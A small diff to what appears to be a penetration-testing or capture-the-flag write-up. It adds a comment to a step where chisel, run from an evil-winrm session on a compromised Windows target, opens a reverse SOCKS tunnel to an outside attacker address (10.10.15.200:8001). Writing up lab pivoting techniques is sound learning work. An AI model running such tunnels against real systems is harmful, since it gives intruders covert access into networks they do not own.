@@ -220,6 +220,7 @@ chisel server -p 8001 --reverse --socks5
 
 **On the target (evil-winrm):**
 ```powershell
+# Upload chisel to the target
 .\chisel.exe client 10.10.15.200:8001 R:socks
 ```
 
